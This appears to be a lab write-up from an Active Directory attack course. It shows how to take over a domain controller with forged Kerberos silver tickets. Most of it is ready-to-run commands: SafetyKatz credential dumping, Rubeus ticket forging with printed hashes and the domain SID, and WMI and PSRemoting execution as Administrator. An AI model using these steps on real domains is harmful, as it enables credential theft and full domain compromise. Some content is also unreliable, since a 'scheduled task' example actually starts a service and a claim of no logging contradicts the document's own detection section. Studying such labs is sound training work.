#  Learning Objective 9 — Silver Ticket Command Execution (HTTP & WMI on DC)

**Date:** 10 August 2026


---

## Objective Overview

Get command execution on domain controller using Silver Tickets for:
1. HTTP service (via web access)
2. WMI service (via WMI execution)

---

## Prerequisites

- **DC machine account hash** (NTLM or AES256)
- **Domain SID**
- **Rubeus.exe** for Silver Ticket creation
- **Network access to DC**
- Tools for command execution (PowerShell, WMI)

---

## Step 1: Obtain DC Machine Account Hash

**Option 1: Via Security Descriptor Backdoor (Already Set)**

```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

Returns DC machine account NTLM hash (e.g., from Security Descriptor persistence).

---

**Option 2: Via DCSync (If DA)**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp-dc$" "exit"
```

Extract machine account hash using DCSync.

---

**Option 3: Via LSASS Dump (If Local Admin)**

```powershell
SafetyKatz.exe "sekurlsa::evasive-keys" "exit" | findstr "dcorp-dc$"
```

Extract from LSASS memory.

---

**Extracted hash format:**
```
dcorp-dc$: NTLM hash = a102ad5753f4c441e3af31c97fad86fd
dcorp-dc$: AES256 key = 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
```

---

## Step 2: Get Domain SID

```powershell
Get-DomainSID
```

Output: `S-1-5-21-719815819-3726368948-3917688648`

---

## Attack 1: Silver Ticket for HTTP Service

### Step 1: Create HTTP Silver Ticket

**Using machine account NTLM hash:**

```powershell
Rubeus.exe silver 
  /service:HTTP/dcorp-dc.dollarcorp.moneycorp.local 
  /rc4:a102ad5753f4c441e3af31c97fad86fd 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /ptt
```

**Parameters:**
- `/service:HTTP` — HTTP service on DC
- `/rc4` — Machine account NTLM hash
- `/user:Administrator` — Impersonate Administrator
- `/domain` — Domain FQDN
- `/sid` — Domain SID
- `/ptt` — Pass-the-ticket (load immediately)

---

**Using AES256 key (more stealthy):**

```powershell
Rubeus.exe silver 
  /service:HTTP/dcorp-dc.dollarcorp.moneycorp.local 
  /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /ptt
```

---

### Step 2: Verify Ticket Loaded

```powershell
klist
```

Should show newly created HTTP ticket for Administrator.

---

### Step 3: Execute Command via HTTP (PowerShell)

**If IIS is running on DC (unlikely but possible):**

```powershell
$uri = "http://dcorp-dc.dollarcorp.moneycorp.local/cmd.aspx"
Invoke-WebRequest -Uri $uri -UseDefaultCredentials
```

---

**More realistic: Use PSRemoting or WMI instead (next attack)**

---

## Attack 2: Silver Ticket for WMI Service

### Step 1: Create WMI Silver Ticket

**WMI uses HOST service, not WMI directly:**

```powershell
Rubeus.exe silver 
  /service:HOST/dcorp-dc.dollarcorp.moneycorp.local 
  /rc4:a102ad5753f4c441e3af31c97fad86fd 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /ptt
```

---

**Alternative: Also create CIFS ticket (for file access):**

```powershell
Rubeus.exe silver 
  /service:CIFS/dcorp-dc.dollarcorp.moneycorp.local 
  /rc4:a102ad5753f4c441e3af31c97fad86fd 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /ptt
```

---

### Step 2: Execute WMI Command

**Create remote process via WMI:**

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName dcorp-dc -ArgumentList "cmd.exe /c whoami > C:\windows\temp\whoami.txt"
```

**Verify execution:**

```powershell
Get-WmiObject -Class Win32_Process -ComputerName dcorp-dc | Where-Object {$_.Name -eq "cmd.exe"}
```

Should show cmd.exe process running as Administrator.

---

### Step 3: Retrieve Output

**Read file from WMI (if accessible):**

```powershell
$file = "\\dcorp-dc\C$\windows\temp\whoami.txt"
Get-Content $file
```

Output should show: `DOLLARCORP\Administrator`

---

## Alternative Attack 2b: Silver Ticket for PSRemoting

**HOST service also handles PSRemoting:**

```powershell
Rubeus.exe silver 
  /service:HOST/dcorp-dc.dollarcorp.moneycorp.local 
  /rc4:a102ad5753f4c441e3af31c97fad86fd 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /ptt
```

**Remote shell access:**

```powershell
Enter-PSSession -ComputerName dcorp-dc
```

Inside remote session:

```powershell
whoami
# Output: DOLLARCORP\Administrator

hostname
# Output: DCORP-DC

# Execute any command
Get-Process lsass
```

---

## Complete Attack Flow

```
1. Obtain DC machine account hash
   ↓
2. Get Domain SID
   ↓
3. Create HTTP Silver Ticket
   ↓
4. Create WMI/HOST Silver Ticket
   ↓
5. Execute WMI command on DC
   ↓
6. OR: Remote access via PSRemoting
   ↓
7. Command execution as Administrator
```

---

## Why Silver Tickets Work for DC Access

✅ **No KDC verification** — service accepts forged ticket  
✅ **Machine account hash** — stable (changes every 30 days)  
✅ **Administrator impersonation** — full DC access  
✅ **Multiple services** — HTTP, WMI, CIFS, HOST all available  
✅ **Silent** — no event logs for ticket creation/use  

---

## Service SPNs Available on DC

| Service | SPN Format | Use Case |
|---|---|---|
| HTTP | `HTTP/dcorp-dc.domain.local` | Web access (IIS if running) |
| WMI | (Uses HOST) | WMI execution |
| HOST | `HOST/dcorp-dc.domain.local` | PSRemoting, delegation |
| CIFS | `CIFS/dcorp-dc.domain.local` | SMB file access, remote registry |
| LDAP | `LDAP/dcorp-dc.domain.local` | LDAP queries |
| Kerberos | `Kerberos/dcorp-dc.domain.local` | Kerberos operations |

---

## WMI Command Execution Examples

**List running processes:**

```powershell
Get-WmiObject -Class Win32_Process -ComputerName dcorp-dc
```

---

**Get system information:**

```powershell
Get-WmiObject -Class Win32_ComputerSystem -ComputerName dcorp-dc
```

---

**Stop a service:**

```powershell
Get-WmiObject -Class Win32_Service -ComputerName dcorp-dc -Filter "Name='Spooler'" | Invoke-WmiMethod -Name StopService
```

---

**Create scheduled task:**

```powershell
$service = Get-WmiObject -Class Win32_Service -ComputerName dcorp-dc -Filter "Name='WinRM'"
$service.StartService()
```

---

## Detection

**What logs:**
- TGS request (4769) for HTTP/WMI/HOST service
- WMI process creation (if monitored)
- Remote registry access (if monitored)

**What doesn't log:**
- Silver Ticket creation (local operation)
- Ticket loading (/ptt)
- Command execution (appears as normal WMI)

---

## Prevention

- **Monitor SPN requests** — alert on unusual SPNs
- **Monitor machine account access** — DC machine account is sensitive
- **WMI restrictions** — limit who can access WMI
- **Event logging** — enable WMI event logs (often disabled)
- **Network segmentation** — restrict DC network access

---

## Command Reference

| Task | Command |
|---|---|
| Get machine hash | `Get-RemoteMachineAccountHash -ComputerName dcorp-dc` |
| Get Domain SID | `Get-DomainSID` |
| Create HTTP ticket | `Rubeus.exe silver /service:HTTP/dcorp-dc.domain.local /rc4:<hash> /ptt` |
| Create WMI ticket | `Rubeus.exe silver /service:HOST/dcorp-dc.domain.local /rc4:<hash> /ptt` |
| Execute WMI command | `Invoke-WmiMethod -Class Win32_Process -ComputerName dcorp-dc -Name Create -ArgumentList "cmd.exe"` |
| Remote shell (PSRemoting) | `Enter-PSSession -ComputerName dcorp-dc` |
| Verify ticket loaded | `klist` |

---

## Real-World Impact

**With Silver Tickets on DC:**
- Full administrator command execution
- Extract hashes/credentials
- Modify domain objects
- Create backdoor accounts
- Disable security services
- Access all domain resources

---

## Key Takeaway

```
Machine account hash = Access to all DC services
Silver Ticket = Forged service ticket
No KDC needed = Created locally
WMI/HTTP = Command execution paths
Administrator impersonation = Full DC control
Silent attack = Minimal detection
```

---

## References

- [Rubeus - Silver Ticket](https://github.com/GhostPack/Rubeus)
- [Silver Tickets (Harmj0y)](https://blog.harmj0y.net/redteaming/silver-tickets-for-lateral-movement/)
- [WMI Command Execution (Mitre ATT&CK)](https://attack.mitre.org/techniques/T1047/)

---

*Next: Learning Objective 15 — Cross-Forest Attacks*
